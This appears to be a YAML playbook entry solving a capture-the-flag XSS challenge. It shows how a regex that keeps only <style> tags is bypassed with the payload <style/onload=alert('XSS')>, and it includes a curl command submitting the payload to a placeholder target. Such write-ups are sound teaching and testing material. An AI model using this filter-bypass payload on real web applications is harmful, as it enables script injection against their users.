name: style_tag_xss_slash_bypass_cross23
category: web
tags: [xss, injection, style_tag, regex_bypass, slash_separator]
indicators:
  - "Regex only allows <style> tag"
  - "Uses negative lookahead (?!style\\b)"
  - "Need to trigger alert('XSS')"
  - "PhantomJS validates XSS"

tricks:
  - name: "Step 1: Identify filter rules"
    when: "Analyze source code"
    how: "Regex <(?!style\\b)[^>]+> removes all non-<style> tags"
    payload: |
      re.sub(blacklist, '', msg)

  - name: "Step 2: Understand regex vulnerability"
    when: "Analyze bypass method"
    how: "\\b is word boundary, / is not a word character"
    payload: |
      style\b still matches style in <style/...>
      Tag is not removed by filter

  - name: "Step 3: Use / to separate attributes"
    when: "Need to add event handler"
    how: "HTML5 allows / to separate tag name and attributes"
    payload: |
      <style/onload=alert('XSS')>

  - name: "Step 4: Browser parsing difference"
    when: "Understand attack principle"
    how: "Regex sees valid style tag, browser parses onload attribute"
    payload: |
      Regex: <style/onload=...> is valid style tag
      Browser: /onload=... parsed as onload attribute

  - name: "Step 5: Submit payload"
    when: "Execute attack"
    how: "GET request to /page with name parameter"
    payload: |
      curl "http://TARGET/page?name=%3Cstyle/onload=alert(%27XSS%27)%3E"
